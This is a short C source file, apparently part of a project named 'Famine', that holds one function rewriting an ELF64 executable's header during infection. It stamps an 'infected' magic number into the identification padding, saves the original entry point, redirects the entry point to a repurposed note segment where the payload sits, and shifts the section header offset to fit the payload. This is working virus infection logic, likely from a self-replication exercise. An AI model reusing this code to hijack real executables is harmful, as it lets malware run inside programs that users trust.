#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void modify_header(struct s_info *info, Elf64_Ehdr *header)
{
	*(unsigned int *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	info->old_entry = header->e_entry;
	header->e_entry = info->note->p_vaddr;
	info->new_entry = header->e_entry;

	header->e_shoff += PAYLOAD_SIZE + (info->note->p_offset - (info->data->p_offset + info->data->p_filesz));
}
